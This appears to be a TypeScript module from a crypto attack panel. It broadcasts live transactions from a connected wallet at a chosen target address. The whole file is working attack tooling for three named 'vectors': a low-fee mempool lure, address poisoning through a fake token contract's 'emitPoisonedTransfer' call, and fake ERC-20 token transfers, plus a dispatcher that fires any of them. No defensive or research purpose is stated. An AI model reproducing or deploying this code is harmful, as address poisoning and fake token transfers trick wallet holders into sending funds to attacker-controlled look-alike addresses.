/**
 * Client-side trigger broadcast via the admin's linked EIP-1193 wallet
 * (MetaMask / Trust Wallet / Rabby / WalletConnect). No seed phrases,
 * no demo signer — the connected wallet signs in-browser.
 */

import {
  encodeFunctionData,
  parseEther,
  type Hash,
  type Hex,
} from "viem";
import {
  getActiveWalletAddress,
  getActiveWalletProvider,
  type Eip1193Provider,
} from "./walletProvider";

export type ClientVector = "mempoolLure" | "addressPoisoning" | "fakeTokenTransfer";

export type ClientTriggerResult = {
  txHash: Hash;
  vector: "MEMPOOL_SPOOF_LURE" | "ADDRESS_POISONING" | "FAKE_TOKEN_TRANSFER";
  targetAddress: string;
  fromAddress: string;
  broadcastAt: string;
};

function requireProvider(): { provider: Eip1193Provider; from: string } {
  const provider = getActiveWalletProvider();
  const from = getActiveWalletAddress();
  if (!provider || !from) {
    throw new Error(
      "No signing wallet connected. Connect MetaMask or WalletConnect (Trust Wallet) first — seed phrases are never accepted."
    );
  }
  return { provider, from };
}

async function sendTx(
  provider: Eip1193Provider,
  tx: {
    from: string;
    to: string;
    data?: Hex;
    value?: Hex;
    maxFeePerGas?: Hex;
    maxPriorityFeePerGas?: Hex;
  }
): Promise<Hash> {
  const hash = (await provider.request({
    method: "eth_sendTransaction",
    params: [tx],
  })) as string;
  if (!hash || typeof hash !== "string" || !hash.startsWith("0x")) {
    throw new Error("Wallet did not return a transaction hash.");
  }
  return hash as Hash;
}

/** Optional: ask wallet to switch to the configured chain. */
export async function ensureWalletChain(chainId: number): Promise<void> {
  const { provider } = requireProvider();
  const hexId = `0x${chainId.toString(16)}`;
  try {
    const current = (await provider.request({ method: "eth_chainId" })) as string;
    if (current?.toLowerCase() === hexId.toLowerCase()) return;
    await provider.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: hexId }],
    });
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    if (/4001|user rejected|denied/i.test(msg)) {
      throw new Error("Chain switch rejected in wallet.");
    }
    // Some wallets return unrecognized chain; leave user to switch manually.
    throw new Error(
      `Switch your wallet to chainId ${chainId} (hex ${hexId}), then retry.`
    );
  }
}

export async function fireMempoolLureFromWallet(
  targetAddress: string,
  amountEth = "0.001",
  chainId?: number
): Promise<ClientTriggerResult> {
  const { provider, from } = requireProvider();
  if (chainId) await ensureWalletChain(chainId);

  // Deliberately low tip/fee hint — wallet may override; still a live lure tx.
  const value = `0x${parseEther(amountEth).toString(16)}` as Hex;
  const txHash = await sendTx(provider, {
    from,
    to: targetAddress,
    value,
    maxPriorityFeePerGas: "0x1",
  });

  return {
    txHash,
    vector: "MEMPOOL_SPOOF_LURE",
    targetAddress,
    fromAddress: from,
    broadcastAt: new Date().toISOString(),
  };
}

export async function fireAddressPoisoningFromWallet(
  targetAddress: string,
  fakeTokenContract: string,
  chainId?: number
): Promise<ClientTriggerResult> {
  const { provider, from } = requireProvider();
  if (chainId) await ensureWalletChain(chainId);

  const data = encodeFunctionData({
    abi: [
      {
        name: "emitPoisonedTransfer",
        type: "function",
        stateMutability: "nonpayable",
        inputs: [{ name: "to", type: "address" }],
        outputs: [],
      },
    ] as const,
    functionName: "emitPoisonedTransfer",
    args: [targetAddress as `0x${string}`],
  });

  const txHash = await sendTx(provider, {
    from,
    to: fakeTokenContract,
    data,
  });

  return {
    txHash,
    vector: "ADDRESS_POISONING",
    targetAddress,
    fromAddress: from,
    broadcastAt: new Date().toISOString(),
  };
}

export async function fireFakeTokenTransferFromWallet(
  targetAddress: string,
  fakeTokenContract: string,
  amount = "1000000000000000000",
  chainId?: number
): Promise<ClientTriggerResult> {
  const { provider, from } = requireProvider();
  if (chainId) await ensureWalletChain(chainId);

  const data = encodeFunctionData({
    abi: [
      {
        name: "transfer",
        type: "function",
        stateMutability: "nonpayable",
        inputs: [
          { name: "to", type: "address" },
          { name: "amount", type: "uint256" },
        ],
        outputs: [{ name: "", type: "bool" }],
      },
    ] as const,
    functionName: "transfer",
    args: [targetAddress as `0x${string}`, BigInt(amount)],
  });

  const txHash = await sendTx(provider, {
    from,
    to: fakeTokenContract,
    data,
  });

  return {
    txHash,
    vector: "FAKE_TOKEN_TRANSFER",
    targetAddress,
    fromAddress: from,
    broadcastAt: new Date().toISOString(),
  };
}

export async function fireVectorFromLinkedWallet(input: {
  vector: ClientVector;
  targetAddress: string;
  fakeTokenContract?: string;
  amount?: string;
  chainId?: number;
}): Promise<ClientTriggerResult> {
  switch (input.vector) {
    case "mempoolLure":
      return fireMempoolLureFromWallet(
        input.targetAddress,
        input.amount ?? "0.001",
        input.chainId
      );
    case "addressPoisoning":
      if (!input.fakeTokenContract) {
        throw new Error("fakeTokenContract is required for address poisoning");
      }
      return fireAddressPoisoningFromWallet(
        input.targetAddress,
        input.fakeTokenContract,
        input.chainId
      );
    case "fakeTokenTransfer":
      if (!input.fakeTokenContract) {
        throw new Error("fakeTokenContract is required for fake token transfer");
      }
      return fireFakeTokenTransferFromWallet(
        input.targetAddress,
        input.fakeTokenContract,
        input.amount ?? "1000000000000000000",
        input.chainId
      );
    default:
      throw new Error(`Unknown vector: ${input.vector}`);
  }
}
